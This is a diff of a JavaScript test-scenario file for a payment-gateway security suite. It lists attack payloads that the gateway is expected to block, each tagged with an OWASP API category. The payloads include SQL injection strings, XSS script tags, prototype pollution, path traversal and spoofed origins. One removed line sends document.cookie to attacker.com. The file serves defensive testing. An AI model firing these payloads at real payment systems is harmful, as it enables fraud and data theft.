@@ -1,10 +1,10 @@
 export const OWASP_CATEGORIES = [
-  { id: 'all', name: 'All Categories', description: 'Complete 29-test security suite', count: 29 },
-  { id: 'bola', name: 'BOLA / IDOR', description: 'Broken Object Level Authorization & Account Isolation', count: 6 },
-  { id: 'business_logic', name: 'Business Logic & Limits', description: 'Transaction Caps, Daily Budget & Arithmetic Edge Cases', count: 6 },
-  { id: 'input_validation', name: 'Input Validation', description: 'Sanitization, Malformed Addresses & Injection Payloads', count: 6 },
-  { id: 'origin_spoofing', name: 'Origin Spoofing', description: 'CORS, Rogue Agents & Network Header Tampering', count: 5 },
-  { id: 'protocol_integrity', name: 'Protocol Integrity', description: 'Whitelist Enforcement, Signatures & Replay Prevention', count: 6 },
+  { id: 'all', name: 'All Categories', description: 'Complete 16-test x402 security suite', count: 16 },
+  { id: 'bola', name: 'BOLA / IDOR', description: 'Broken Object Level Authorization & Account Isolation', count: 3 },
+  { id: 'business_logic', name: 'Business Logic & Limits', description: 'x402 Transaction Caps & Daily Budget Safeguards', count: 3 },
+  { id: 'input_validation', name: 'Input Validation', description: 'Sanitization, SQLi, XSS & Parameter Type Safeguards', count: 3 },
+  { id: 'origin_spoofing', name: 'Origin Spoofing', description: 'CORS, Phishing Paywalls & Origin Authentication', count: 3 },
+  { id: 'protocol_integrity', name: 'Protocol Integrity', description: 'x402 Signatures, Replay Prevention & Whitelisting', count: 4 },
 ];
 
 export const normalizeCategory = (cat) => {
@@ -33,587 +33,377 @@ export const findScenario = (idOrIndex) => {
 };
 
 export const ATTACK_SCENARIOS = [
-  // Category 1: BOLA / IDOR (6 vectors)
+  // =========================================================================
+  // Category 1: BOLA / IDOR (3 vectors)
+  // =========================================================================
   {
     id: 'bola-01',
-    name: 'Cross-Tenant Account Drainage',
+    aliasIds: ['BOLA-01', 'bola-01'],
+    name: 'Unauthorized Account ID Tampering (IDOR)',
     category: 'bola',
     categoryName: 'BOLA / IDOR',
     type: 'attack',
     severity: 'CRITICAL',
     owaspCode: 'API1:2023 - Broken Object Level Authorization',
-    description: 'Agent attempts to trigger debit from victim account ID act_victim_4401 without authorization context.',
+    description: "Agent attempts to debit payment from another user's account_id ('victim_acc_9921').",
     payload: {
-      account_id: 'act_victim_4401',
-      recipient: '0xAttacker...DeadBeef',
-      amount: 45.00,
+      account_id: 'victim_acc_9921',
+      recipient: '0x71C8451C3343344Fc4534664634234567890abcd',
+      amount: 25.00,
       currency: 'USD',
-      origin: 'https://payfence.internal',
-      timestamp: Date.now()
+      origin: 'https://app.payfence.io',
+      x402_header: {
+        protocol: 'x402',
+        version: '1.0',
+        client: 'ai-agent'
+      }
     },
     expectedStatus: 403,
     expectedAction: 'BLOCKED',
-    policyRule: 'Policy #SEC-BOLA-01: Account ownership assertion failed. Target account does not match authenticated agent context.'
+    policyRule: "Account ID 'victim_acc_9921' does not match authenticated user account context."
   },
   {
     id: 'bola-02',
-    name: 'Wallet Session Hijack Attempt',
+    aliasIds: ['BOLA-02', 'bola-02'],
+    name: 'Cross-Tenant Wallet Drain Attempt',
     category: 'bola',
     categoryName: 'BOLA / IDOR',
     type: 'attack',
-    severity: 'HIGH',
+    severity: 'CRITICAL',
     owaspCode: 'API1:2023 - Broken Object Level Authorization',
-    description: 'Replaying expired session token with changed destination address.',
+    description: 'Unauthorized sourceAccount vault parameter referencing another tenant partition.',
     payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x999...BEEF',
-      amount: 25.00,
+      sourceAccount: 'vault_tenant_beta_009',
+      recipient: '0x71C8451C3343344Fc4534664634234567890abcd',
+      amount: 35.00,
       currency: 'USD',
-      session_token: 'sess_stale_expired_token_882',
-      timestamp: Date.now() - 400000
+      origin: 'https://app.payfence.io'
     },
     expectedStatus: 403,
     expectedAction: 'BLOCKED',
-    policyRule: 'Policy #SEC-BOLA-02: Stale session token detected. Replay protection threshold triggered (>300s window).'
+    policyRule: "Source vault 'vault_tenant_beta_009' belongs to another tenant partition."
   },
   {
     id: 'bola-03',
-    name: 'Sub-Account Scope Escalation',
+    aliasIds: ['BOLA-03', 'bola-03'],
+    name: 'Admin Role Privilege Escalation',
     category: 'bola',
     categoryName: 'BOLA / IDOR',
     type: 'attack',
     severity: 'HIGH',
     owaspCode: 'API5:2023 - Broken Function Level Authorization',
-    description: 'Restricted read-only sub-agent attempting payment execution.',
+    description: 'Payload body injects role: "admin" and isAdmin: true to bypass policy limits.',
     payload: {
-      account_id: 'act_readonly_sub3',
-      recipient: '0x71C...8942',
-      amount: 10.00,
+      role: 'admin',
+      isAdmin: true,
+      recipient: '0x71C8451C3343344Fc4534664634234567890abcd',
+      amount: 40.00,
       currency: 'USD',
-      scope: 'read_telemetry',
-      origin: 'https://payfence.internal'
+      origin: 'https://app.payfence.io'
     },
     expectedStatus: 403,
     expectedAction: 'BLOCKED',
-    policyRule: 'Policy #SEC-AUTH-03: Insufficient agent permission scope. Required: "payments:execute", Provided: "read_telemetry".'
-  },
-  {
-    id: 'bola-04',
-    name: 'Tenant Boundary Traversal',
-    category: 'bola',
-    categoryName: 'BOLA / IDOR',
-    type: 'attack',
-    severity: 'CRITICAL',
-    owaspCode: 'API1:2023 - Broken Object Level Authorization',
-    description: 'Path manipulation in account identifier attempting directory or tenant escape (../../admin).',
-    payload: {
-      account_id: '../../admin/treasury',
-      recipient: '0x71C...8942',
-      amount: 50.00,
-      currency: 'USD'
-    },
-    expectedStatus: 403,
-    expectedAction: 'BLOCKED',
-    policyRule: 'Policy #SEC-VAL-04: Malformed account identifier. Path traversal characters prohibited.'
-  },
-  {
-    id: 'bola-05',
-    name: 'Tampered Body User Identity',
-    category: 'bola',
-    categoryName: 'BOLA / IDOR',
-    type: 'attack',
-    severity: 'HIGH',
-    owaspCode: 'API1:2023 - Broken Object Level Authorization',
-    description: 'Mismatched JWT claim identity vs payload body user_id.',
-    payload: {
-      account_id: 'act_live_9921',
-      override_user_id: 'usr_root_system_0',
-      recipient: '0x71C...8942',
-      amount: 30.00,
-      currency: 'USD'
-    },
-    expectedStatus: 403,
-    expectedAction: 'BLOCKED',
-    policyRule: 'Policy #SEC-BOLA-05: Identity spoofing detected. Body parameter override_user_id conflicts with validated token.'
-  },
-  {
-    id: 'bola-06',
-    name: 'Forged Cryptographic Proof',
-    category: 'bola',
-    categoryName: 'BOLA / IDOR',
-    type: 'attack',
-    severity: 'CRITICAL',
-    owaspCode: 'API2:2023 - Broken Authentication',
-    description: 'Fake zero-knowledge signature submitted to bypass ownership check.',
-    payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 15.00,
-      currency: 'USD',
-      proof: 'zk_fake_sig_404_invalid_curve_point'
-    },
-    expectedStatus: 403,
-    expectedAction: 'BLOCKED',
-    policyRule: 'Policy #SEC-SIG-06: Cryptographic proof verification failed. Invalid ECDSA/Ed25519 signature curve point.'
+    policyRule: "Privilege escalation detected: role parameter 'admin' cannot be supplied in payment payload."
   },
 
-  // Category 2: Business Logic & Limits (6 vectors)
+  // =========================================================================
+  // Category 2: Business Logic & Limits (3 vectors)
+  // =========================================================================
   {
     id: 'logic-01',
-    name: 'Excessive Transaction Cap ($750)',
+    aliasIds: ['LOGIC-01', 'logic-01'],
+    name: 'x402 Overpayment Attack ($750 > $50 Cap)',
     category: 'business_logic',
     categoryName: 'Business Logic & Limits',
     type: 'attack',
-    severity: 'HIGH',
+    severity: 'CRITICAL',
     owaspCode: 'API4:2023 - Unrestricted Resource Consumption',
-    description: 'Autonomous payment request exceeding hard per-transaction limit of $50.00.',
+    description: 'Malicious upstream paywall demands $750.00, far exceeding the hard $50.00 per-transaction cap.',
     payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
+      recipient: '0x71C8451C3343344Fc4534664634234567890abcd',
       amount: 750.00,
       currency: 'USD',
-      origin: 'https://payfence.internal'
+      origin: 'https://app.payfence.io',
+      x402_header: {
+        demand: 750.00
+      }
     },
     expectedStatus: 403,
     expectedAction: 'BLOCKED',
-    policyRule: 'Policy #LIM-CAP-01: Amount $750.00 exceeds configured hard per-transaction cap ($50.00).'
+    policyRule: 'Amount $750.00 exceeds configured hard per-transaction cap ($50.00).'
   },
   {
     id: 'logic-02',
-    name: 'Negative Value Reverse Debit',
-    category: 'business_logic',
-    categoryName: 'Business Logic & Limits',
-    type: 'attack',
-    severity: 'CRITICAL',
-    owaspCode: 'API4:2023 - Business Logic Violation',
-    description: 'Negative amount submitted (-$100.00) to invert ledger transaction and siphon funds.',
-    payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: -100.00,
-      currency: 'USD'
-    },
-    expectedStatus: 403,
-    expectedAction: 'BLOCKED',
-    policyRule: 'Policy #LIM-MATH-02: Amount must be strictly positive (> 0.00). Negative values prohibited.'
-  },
-  {
-    id: 'logic-03',
-    name: 'Zero-Value Drain Attack',
-    category: 'business_logic',
-    categoryName: 'Business Logic & Limits',
-    type: 'attack',
-    severity: 'MEDIUM',
-    owaspCode: 'API4:2023 - Unrestricted Resource Consumption',
-    description: 'Zero amount transfer attempting to trigger unmetered backend gas/compute fee consumption.',
-    payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 0.00,
-      currency: 'USD'
-    },
-    expectedStatus: 403,
-    expectedAction: 'BLOCKED',
-    policyRule: 'Policy #LIM-MATH-03: Zero-value transactions rejected. Minimum allowable payment is $0.01.'
-  },
-  {
-    id: 'logic-04',
-    name: 'Daily Budget Overflow ($200 Cap)',
+    aliasIds: ['LOGIC-02', 'logic-02'],
+    name: 'Daily Budget Exhaustion Attack (> $200 Limit)',
     category: 'business_logic',
     categoryName: 'Business Logic & Limits',
     type: 'attack',
     severity: 'HIGH',
     owaspCode: 'API4:2023 - Unrestricted Resource Consumption',
-    description: 'Transaction within per-tx cap but exceeds cumulative 24h rolling budget threshold.',
+    description: 'Cumulative spend reaches $185.00; requesting $45.00 exceeds the $200.00 daily safety budget.',
     payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 49.00,
-      cumulative_today: 195.00,
-      currency: 'USD'
+      recipient: '0x71C8451C3343344Fc4534664634234567890abcd',
+      amount: 45.00,
+      currency: 'USD',
+      origin: 'https://app.payfence.io'
     },
     expectedStatus: 403,
     expectedAction: 'BLOCKED',
-    policyRule: 'Policy #LIM-BUDGET-04: Daily rolling budget exceeded. Spent: $195.00, Requested: $49.00, Daily Cap: $200.00.'
+    policyRule: 'Cumulative daily spend ($230.00) exceeds daily budget limit ($200.00). Current spent today: $185.00.'
   },
   {
-    id: 'logic-05',
-    name: 'IEEE-754 Micro-Dusting Exploit',
+    id: 'logic-03',
+    aliasIds: ['LOGIC-03', 'logic-03'],
+    name: 'Negative or Zero Amount Exploit',
     category: 'business_logic',
     categoryName: 'Business Logic & Limits',
     type: 'attack',
-    severity: 'MEDIUM',
+    severity: 'HIGH',
     owaspCode: 'API4:2023 - Business Logic Flaw',
-    description: 'Floating point precision exploitation with sub-cent fraction (0.00000000001).',
+    description: 'Payload sends negative amount (-50.00) attempting balance inversion and ledger corruption.',
     payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 0.00000000001,
-      currency: 'USD'
+      recipient: '0x71C8451C3343344Fc4534664634234567890abcd',
+      amount: -50.00,
+      currency: 'USD',
+      origin: 'https://app.payfence.io'
     },
     expectedStatus: 403,
     expectedAction: 'BLOCKED',
-    policyRule: 'Policy #LIM-PRECISION-05: Precision limit violation. Maximum 2 decimal places permitted for standard fiat/USDC.'
-  },
-  {
-    id: 'logic-06',
-    name: 'Rapid Double-Spending Race Burst',
-    category: 'business_logic',
-    categoryName: 'Business Logic & Limits',
-    type: 'attack',
-    severity: 'CRITICAL',
-    owaspCode: 'API6:2023 - Unrestricted Resource Consumption',
-    description: 'Concurrent duplicate transaction nonces fired within 10ms window.',
-    payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 40.00,
-      nonce: 10442,
-      replay_id: 'dup_race_tx_001'
-    },
-    expectedStatus: 403,
-    expectedAction: 'BLOCKED',
-    policyRule: 'Policy #LIM-CONCURRENCY-06: Nonce reuse detected. Duplicate sequence number 10442 already processed.'
+    policyRule: 'Payment amount must be greater than zero. Received: -50.0'
   },
 
-  // Category 3: Input Validation (6 vectors)
+  // =========================================================================
+  // Category 3: Input Validation (3 vectors)
+  // =========================================================================
   {
     id: 'input-01',
-    aliasIds: ['val-01', 'input-01'],
-    name: 'SQL / NoSQL Injection in Memo',
+    aliasIds: ['INPUT-01', 'input-01'],
+    name: 'SQL Injection in x402 Payment Memo/Recipient',
     category: 'input_validation',
     categoryName: 'Input Validation',
     type: 'attack',
     severity: 'CRITICAL',
     owaspCode: 'API8:2023 - Security Misconfiguration / Injection',
-    description: 'SQL statement injection within transaction memo string.',
+    description: 'Payload contains SQL meta-characters and injection clauses in payment parameters.',
     payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 15.00,
-      memo: "'; DROP TABLE audit_logs; --"
+      recipient: "0x71C8451C3343344Fc4534664634234567890abcd' OR '1'='1 --",
+      amount: 10.00,
+      currency: 'USD',
+      origin: 'https://app.payfence.io',
+      memo: "' OR '1'='1 --"
     },
     expectedStatus: 403,
     expectedAction: 'BLOCKED',
-    policyRule: 'Policy #VAL-INJECT-01: Disallowed SQL control characters detected in memo parameter.'
+    policyRule: "SQL injection signature detected in payment parameters (' OR '1'='1 --)."
   },
   {
     id: 'input-02',
-    aliasIds: ['val-02', 'input-02'],
-    name: 'Stored XSS Payload in Metadata',
+    aliasIds: ['INPUT-02', 'input-02'],
+    name: 'Cross-Site Scripting (XSS) in Payment Metadata',
     category: 'input_validation',
     categoryName: 'Input Validation',
     type: 'attack',
     severity: 'HIGH',
-    owaspCode: 'API8:2023 - Injection',
-    description: 'Cross-site scripting vector inside billing description.',
+    owaspCode: 'API8:2023 - Input Sanitization',
+    description: "Malicious agent submits `<script>alert('hack')</script>` inside transaction memo.",
     payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 10.00,
-      memo: '<script>fetch("https://attacker.com/steal?"+document.cookie)</script>'
+      recipient: '0x71C8451C3343344Fc4534664634234567890abcd',
+      amount: 15.00,
+      currency: 'USD',
+      origin: 'https://app.payfence.io',
+      memo: "<script>alert('hack')</script>"
     },
     expectedStatus: 403,
     expectedAction: 'BLOCKED',
-    policyRule: 'Policy #VAL-XSS-02: HTML/Script tags detected in text field. Input rejected by sanitization gate.'
+    policyRule: "Cross-site scripting (XSS) payload detected in payment metadata (<script> tags)."
   },
   {
     id: 'input-03',
-    aliasIds: ['val-03', 'input-03'],
-    name: 'Type Mismatch String-As-Amount',
+    aliasIds: ['INPUT-03', 'input-03'],
+    name: 'Parameter Type Confusion (String as Amount)',
     category: 'input_validation',
     categoryName: 'Input Validation',
     type: 'attack',
     severity: 'MEDIUM',
-    owaspCode: 'API3:2023 - Broken Object Property Level Authorization',
-    description: 'Passing string representation containing logical tautology instead of number.',
+    owaspCode: 'API8:2023 - Lack of Input Validation',
+    description: "Amount is provided as string '100_USD' instead of a numeric float to exploit weak type coercions.",
     payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: '50.00 OR 1=1'
+      recipient: '0x71C8451C3343344Fc4534664634234567890abcd',
+      amount: '100_USD',
+      currency: 'USD',
+      origin: 'https://app.payfence.io'
     },
     expectedStatus: 403,
     expectedAction: 'BLOCKED',
-    policyRule: 'Policy #VAL-TYPE-03: Strict type validation failed. Amount must be a valid positive float/integer.'
-  },
-  {
-    id: 'input-04',
-    aliasIds: ['val-04', 'input-04'],
-    name: 'Malformed Recipient Address Checksum',
-    category: 'input_validation',
-    categoryName: 'Input Validation',
-    type: 'attack',
-    severity: 'HIGH',
-    owaspCode: 'API8:2023 - Lack of Protection from Automated Threats',
-    description: 'Corrupted Ethereum/Solana wallet address with invalid hex character and length.',
-    payload: {
-      account_id: 'act_live_9921',
-      recipient: '0xZZZZ_invalid_hex_string_398',
-      amount: 20.00
-    },
-    expectedStatus: 403,
-    expectedAction: 'BLOCKED',
-    policyRule: 'Policy #VAL-ADDR-04: Recipient address format invalid. Must match valid hexadecimal EVM address regex.'
-  },
-  {
-    id: 'input-05',
-    aliasIds: ['val-05', 'input-05'],
-    name: 'Integer Overflow Simulation (> MAX_SAFE)',
-    category: 'input_validation',
-    categoryName: 'Input Validation',
-    type: 'attack',
-    severity: 'HIGH',
-    owaspCode: 'API4:2023 - Unrestricted Resource Consumption',
-    description: 'Number exceeding JavaScript MAX_SAFE_INTEGER (9007199254740992).',
-    payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 9007199254740999
-    },
-    expectedStatus: 403,
-    expectedAction: 'BLOCKED',
-    policyRule: 'Policy #VAL-OVERFLOW-05: Numerical boundary exceeded. Amount exceeds IEEE 754 safe integer limits.'
-  },
-  {
-    id: 'input-06',
-    aliasIds: ['val-06', 'input-06'],
-    name: 'Prototype Pollution Injection (__proto__)',
-    category: 'input_validation',
-    categoryName: 'Input Validation',
-    type: 'attack',
-    severity: 'CRITICAL',
-    owaspCode: 'API8:2023 - Security Misconfiguration',
-    description: 'Object payload containing prototype pollution key __proto__.isAdmin.',
-    payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 15.00,
-      __proto__: { isAdmin: true }
-    },
-    expectedStatus: 403,
-    expectedAction: 'BLOCKED',
-    policyRule: 'Policy #VAL-PROTO-06: Hazardous object property __proto__ or constructor detected in payload.'
+    policyRule: 'Amount parameter must be a numeric value, received string.'
   },
 
-  // Category 4: Origin Spoofing & Network (5 vectors)
+  // =========================================================================
+  // Category 4: Origin Spoofing (3 vectors)
+  // =========================================================================
   {
     id: 'origin-01',
-    name: 'Rogue External Origin Domain',
+    aliasIds: ['ORIGIN-01', 'origin-01'],
+    name: 'Untrusted Phishing Paywall Origin',
     category: 'origin_spoofing',
     categoryName: 'Origin Spoofing',
     type: 'attack',
     severity: 'HIGH',
-    owaspCode: 'API7:2023 - Server Side Request Forgery / Origin Bypass',
-    description: 'Request originated from untrusted domain evil-agent-bot.xyz.',
+    owaspCode: 'API7:2023 - Server-Side Request Forgery / Origin Spoofing',
+    description: "Payment invocation comes from unauthorized external origin 'https://evil-paywall-bot.xyz'.",
     payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 25.00,
-      origin: 'https://evil-agent-bot.xyz'
+      recipient: '0x71C8451C3343344Fc4534664634234567890abcd',
+      amount: 20.00,
+      currency: 'USD',
+      origin: 'https://evil-paywall-bot.xyz'
     },
     expectedStatus: 403,
     expectedAction: 'BLOCKED',
-    policyRule: 'Policy #NET-CORS-01: Origin https://evil-agent-bot.xyz not in approved gateway whitelist.'
+    policyRule: "Caller origin 'https://evil-paywall-bot.xyz' is not authorized in security policy whitelist."
   },
   {
     id: 'origin-02',
-    name: 'Missing Origin Header (Headless Bot)',
+    aliasIds: ['ORIGIN-02', 'origin-02'],
+    name: 'Subdomain Spoofing Attack',
+    category: 'origin_spoofing',
+    categoryName: 'Origin Spoofing',
+    type: 'attack',
+    severity: 'HIGH',
+    owaspCode: 'API7:2023 - Server-Side Request Forgery / Origin Spoofing',
+    description: "Attacker creates 'https://app.payfence.io.attacker.com' attempting suffix origin confusion.",
+    payload: {
+      recipient: '0x71C8451C3343344Fc4534664634234567890abcd',
+      amount: 25.00,
+      currency: 'USD',
+      origin: 'https://app.payfence.io.attacker.com'
+    },
+    expectedStatus: 403,
+    expectedAction: 'BLOCKED',
+    policyRule: "Caller origin 'https://app.payfence.io.attacker.com' is not authorized in security policy whitelist."
+  },
+  {
+    id: 'origin-03',
+    aliasIds: ['ORIGIN-03', 'origin-03'],
+    name: 'Missing or Null Origin Header',
     category: 'origin_spoofing',
     categoryName: 'Origin Spoofing',
     type: 'attack',
     severity: 'MEDIUM',
-    owaspCode: 'API8:2023 - Lack of Protection from Automated Threats',
-    description: 'Raw curl/socket call with stripped Origin and Referer headers.',
+    owaspCode: 'API7:2023 - Missing Security Headers',
+    description: "Request originates from an unverified or sandboxed 'null' origin.",
     payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
+      recipient: '0x71C8451C3343344Fc4534664634234567890abcd',
       amount: 10.00,
-      origin: null
-    },
-    expectedStatus: 403,
-    expectedAction: 'BLOCKED',
-    policyRule: 'Policy #NET-HDR-02: Mandatory origin verification header missing from payment request.'
-  },
-  {
-    id: 'origin-03',
-    name: 'Subdomain Prefix Phishing Spoof',
-    category: 'origin_spoofing',
-    categoryName: 'Origin Spoofing',
-    type: 'attack',
-    severity: 'HIGH',
-    owaspCode: 'API7:2023 - Server Side Request Forgery',
-    description: 'Attacker hosted domain mimics official host (payfence.internal.attacker.cc).',
-    payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 20.00,
-      origin: 'https://payfence.internal.attacker.cc'
-    },
-    expectedStatus: 403,
-    expectedAction: 'BLOCKED',
-    policyRule: 'Policy #NET-CORS-03: Subdomain wildcard bypass rejected. Strict origin match required.'
-  },
-  {
-    id: 'origin-04',
-    name: 'Null Origin Sandbox Escape',
-    category: 'origin_spoofing',
-    categoryName: 'Origin Spoofing',
-    type: 'attack',
-    severity: 'HIGH',
-    owaspCode: 'API7:2023 - Origin Misconfiguration',
-    description: 'Browser iframe sandbox escape sending Origin: "null".',
-    payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 12.00,
+      currency: 'USD',
       origin: 'null'
     },
     expectedStatus: 403,
     expectedAction: 'BLOCKED',
-    policyRule: 'Policy #NET-HDR-04: Opaque / "null" origin rejected. Request must originate from authenticated perimeter.'
-  },
-  {
-    id: 'origin-05',
-    name: 'Spoofed Localhost Loopback',
-    category: 'origin_spoofing',
-    categoryName: 'Origin Spoofing',
-    type: 'attack',
-    severity: 'HIGH',
-    owaspCode: 'API7:2023 - SSRF',
-    description: 'X-Forwarded-For claiming 127.0.0.1 from external public IP.',
-    payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 35.00,
-      origin: 'http://localhost:5000',
-      client_ip: '198.51.100.44'
-    },
-    expectedStatus: 403,
-    expectedAction: 'BLOCKED',
-    policyRule: 'Policy #NET-IP-05: Proxy header spoofing detected. IP 198.51.100.44 does not match localhost loopback.'
+    policyRule: 'Sandboxed null origin is strictly prohibited from executing payments.'
   },
 
-  // Category 5: Protocol Integrity & Whitelisting (5 vectors)
+  // =========================================================================
+  // Category 5: Protocol Integrity (3 attacks + 1 control)
+  // =========================================================================
   {
     id: 'proto-01',
-    name: 'Unwhitelisted External Recipient',
+    aliasIds: ['PROTO-01', 'proto-01'],
+    name: 'x402 Replay Attack (Expired Timestamp)',
     category: 'protocol_integrity',
-    categoryName: 'Protocol Integrity & Whitelist',
+    categoryName: 'Protocol Integrity',
     type: 'attack',
     severity: 'CRITICAL',
     owaspCode: 'API10:2023 - Unsafe Consumption of APIs',
-    description: 'Recipient account is not present in approved merchant whitelist.',
+    description: 'Replaying an expired x402 payment header with timestamp exceeding the 5-minute skew tolerance.',
     payload: {
-      account_id: 'act_live_9921',
-      recipient: '0xDarkPool_9918a0e_Unverified',
-      amount: 18.00,
+      recipient: '0x71C8451C3343344Fc4534664634234567890abcd',
+      amount: 15.00,
       currency: 'USD',
-      origin: 'https://payfence.internal'
+      origin: 'https://app.payfence.io',
+      timestamp: 1600000000000,
+      x402_header: {
+        nonce: 'nonce_expired_8812',
+        timestamp: 1600000000000
+      }
     },
     expectedStatus: 403,
     expectedAction: 'BLOCKED',
-    policyRule: 'Policy #WL-RECIP-01: Recipient address 0xDarkPool_9918a0e_Unverified is not on the approved whitelist.'
+    policyRule: 'Transaction timestamp exceeds maximum allowable time skew (>300s window). Possible x402 replay attack intercepted.'
   },
   {
     id: 'proto-02',
-    name: 'Missing HMAC Request Signature',
+    aliasIds: ['PROTO-02', 'proto-02'],
+    name: 'Tampered x402 Payment Signature',
     category: 'protocol_integrity',
-    categoryName: 'Protocol Integrity & Whitelist',
+    categoryName: 'Protocol Integrity',
     type: 'attack',
-    severity: 'HIGH',
+    severity: 'CRITICAL',
     owaspCode: 'API2:2023 - Broken Authentication',
-    description: 'Payload lacks required cryptographic signature header (x-payfence-signature).',
+    description: 'Attacker modifies in-flight payment amount but provides an invalid/tampered cryptographic signature.',
     payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 15.00,
-      signature: null
+      recipient: '0x71C8451C3343344Fc4534664634234567890abcd',
+      amount: 20.00,
+      currency: 'USD',
+      origin: 'https://app.payfence.io',
+      signature: 'tampered_sig_deadbeef',
+      x402_header: {
+        signature: 'tampered_sig_deadbeef'
+      }
     },
     expectedStatus: 403,
     expectedAction: 'BLOCKED',
-    policyRule: 'Policy #SEC-SIG-02: Cryptographic signature required. Missing x-payfence-signature header.'
+    policyRule: 'Cryptographic signature verification failed or x402 header was tampered.'
   },
   {
     id: 'proto-03',
-    name: 'Clock Skew Replay Attack (> 300s)',
+    aliasIds: ['PROTO-03', 'proto-03'],
+    name: 'Unwhitelisted Rogue Recipient Wallet',
     category: 'protocol_integrity',
-    categoryName: 'Protocol Integrity & Whitelist',
+    categoryName: 'Protocol Integrity',
     type: 'attack',
     severity: 'HIGH',
-    owaspCode: 'API8:2023 - Lack of Protection from Automated Threats',
-    description: 'Timestamp is 12 minutes in the past, triggering anti-replay gate.',
-    payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 22.00,
-      timestamp: Date.now() - (720 * 1000)
-    },
-    expectedStatus: 403,
-    expectedAction: 'BLOCKED',
-    policyRule: 'Policy #SEC-TIME-03: Request timestamp delta exceeds tolerance (720s > max allowable 300s).'
-  },
-  {
-    id: 'proto-04',
-    name: 'Payload Hash Mismatch (In-Flight Tamper)',
-    category: 'protocol_integrity',
-    categoryName: 'Protocol Integrity & Whitelist',
-    type: 'attack',
-    severity: 'CRITICAL',
     owaspCode: 'API10:2023 - Unsafe Consumption of APIs',
-    description: 'Content digest does not match SHA-256 hash calculated over body.',
+    description: "Attempting payment to an unknown non-whitelisted wallet address '0xDeadBeef0000000000000000000000000000dEaD'.",
     payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 49.99,
-      sha256_digest: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
+      recipient: '0xDeadBeef0000000000000000000000000000dEaD',
+      amount: 30.00,
+      currency: 'USD',
+      origin: 'https://app.payfence.io'
     },
     expectedStatus: 403,
     expectedAction: 'BLOCKED',
-    policyRule: 'Policy #SEC-HASH-04: Body hash mismatch. Payload was modified in transit after signing.'
+    policyRule: "Recipient address '0xDeadBeef0000000000000000000000000000dEaD' is not in the approved vendor whitelist."
   },
-  {
-    id: 'proto-05',
-    name: 'Unsupported Spoofed Asset Symbol',
-    category: 'protocol_integrity',
-    categoryName: 'Protocol Integrity & Whitelist',
-    type: 'attack',
-    severity: 'MEDIUM',
-    owaspCode: 'API10:2023 - Unsafe Consumption of APIs',
-    description: 'Injecting bogus currency token symbol ("SHIB-SCAM") not supported by gateway.',
-    payload: {
-      account_id: 'act_live_9921',
-      recipient: '0x71C...8942',
-      amount: 20.00,
-      currency: 'SHIB-SCAM'
-    },
-    expectedStatus: 403,
-    expectedAction: 'BLOCKED',
-    policyRule: 'Policy #SEC-CURR-05: Unsupported asset type "SHIB-SCAM". Only verified currencies (USD, USDC) permitted.'
-  },
-
-  // 6. Legitimate Control Benchmark (1 control vector)
   {
     id: 'ctrl-01',
-    aliasIds: ['control-01', 'ctrl-01'],
-    name: 'Legitimate Whitelisted Autonomous Payment (Control)',
+    aliasIds: ['control-01', 'ctrl-01', 'CTRL-01'],
+    name: 'Legitimate x402 Agent Micropayment',
     category: 'protocol_integrity',
-    categoryName: 'Protocol Integrity & Whitelist',
+    categoryName: 'Protocol Integrity',
     type: 'legitimate',
     severity: 'LOW',
     owaspCode: 'API10:2023 - Control Benchmark',
-    description: 'Standard authorized autonomous micro-payment under $50.00 to a whitelisted recipient with authentic origin.',
+    description: 'Standard legitimate autonomous payment under $50.00 to a whitelisted vendor with authentic origin.',
     payload: {
-      account_id: 'act_live_9921',
+      account_id: 'usr_demo_01',
       recipient: '0x71C8451C3343344Fc4534664634234567890abcd',
       amount: 12.50,
       currency: 'USD',
       origin: 'https://app.payfence.io',
       userId: 'usr_demo_01',
-      memo: 'Inference token subscription batch #41',
-      timestamp: Date.now()
+      memo: 'x402 AI Agent inference token subscription batch #41',
+      timestamp: Date.now(),
+      x402_header: {
+        protocol: 'x402',
+        version: '1.0',
+        payment_scheme: 'exact',
+        client: 'autonomous-agent-v1',
+        signature: 'sig_valid_x402_ed25519_verified_token_9942'
+      }
     },
     expectedStatus: 200,
     expectedAction: 'APPROVED',
-    policyRule: 'Policy #P-101: Transaction permitted under $50.00 cap, whitelisted vendor, valid origin, budget available.'
+    policyRule: 'Payment validated successfully: within limits, whitelisted recipient, verified origin and x402 header.'
   }
 ];
